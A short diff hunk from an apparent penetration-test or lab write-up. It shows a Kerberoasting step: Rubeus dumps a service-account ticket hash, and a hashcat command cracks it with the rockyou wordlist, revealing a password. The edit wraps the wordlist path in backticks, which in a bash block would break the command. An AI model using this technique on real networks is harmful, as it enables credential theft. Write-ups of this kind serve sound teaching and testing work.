@@ -72,7 +72,7 @@ We upload `Rubeus.exe` to extract the hash:
 Rubeus dumps the `$krb5tgs$23` hash for `svc_mssql`.
 Using `hashcat`, we crack it:
 ```bash
-hashcat -m 13100 mssql.hash /usr/share/wordlists/rockyou.txt
+hashcat -m 13100 mssql.hash `/usr/share/wordlists/rockyou.txt`
 # Password: trustno1
 ```
 
